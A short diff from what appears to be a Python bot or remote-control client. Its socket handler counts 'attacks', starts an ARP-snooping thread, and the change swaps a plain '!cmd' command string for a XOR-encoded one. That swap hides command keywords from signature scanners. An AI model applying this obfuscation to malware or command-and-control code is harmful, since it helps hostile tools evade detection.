@@ -196,7 +196,7 @@ def handle(sock):
 						p = threading.Thread(target=arp_table_snoop)
 						p.start()
 					attack+=1
-				elif command[0] == '!cmd':
+				elif command[0] == xor_dec('QBAJAg==',key):# !cmd
 					if attack != 0:
 						stop = True
 						attack = 0
